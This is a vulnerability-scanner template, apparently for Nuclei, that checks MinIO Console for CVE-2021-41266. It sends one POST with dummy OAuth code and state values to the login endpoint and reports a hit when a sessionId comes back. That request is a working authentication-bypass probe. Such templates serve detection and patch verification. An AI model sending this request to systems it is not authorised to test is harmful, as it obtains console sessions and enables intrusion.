id: cve-2021-41266

info:
  name: MinIO Console Information Disclosure
  author: ProjectDiscoveryAI
  severity: high
  description: |
    MinIO 0.12.2 and earlier versions have an access control error vulnerability. When external IDP is enabled, the affected version will encounter authentication bypass issues in the console. Attackers can use vulnerabilities to obtain sensitive information to log in to the system.
  reference:
    - https://github.com/minio/console/security/advisories/GHSA-4999-659w-mq36
    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202111-1271
  classification:
    cve-id: CVE-2021-41266
    cvss-score: 9.8
  tags: information-disclosure

http:
  - raw:
      - |
        POST /api/v1/login/oauth2/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"code":"test","state":"test"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
      - type: word
        words:
          - "sessionId"
        part: body
